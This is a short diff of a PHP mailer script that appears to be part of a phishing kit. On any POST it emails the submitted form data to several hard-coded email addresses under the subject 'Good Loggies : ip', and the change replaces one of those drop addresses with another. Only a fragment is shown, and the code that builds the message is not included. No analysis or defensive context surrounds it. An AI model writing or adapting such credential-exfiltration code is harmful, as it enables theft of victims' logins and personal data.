@@ -7,7 +7,7 @@ if(!empty($_POST)) {
 
 		$to = "netlifhost@protonmail.com";
 		$to1 = "jameselvis@iname.com";
-		$to2 = "netlifhost@protonmail.com";
+		$to2 = "silentquake24@gmail.com";
 
 
          $subject = "Good Loggies : ip";
@@ -20,6 +20,5 @@ if(!empty($_POST)) {
          $header .= "Content-type: text/html\r\n";
 
 		 mail ($to,$subject,$message,$header);
-
 }
 ?>
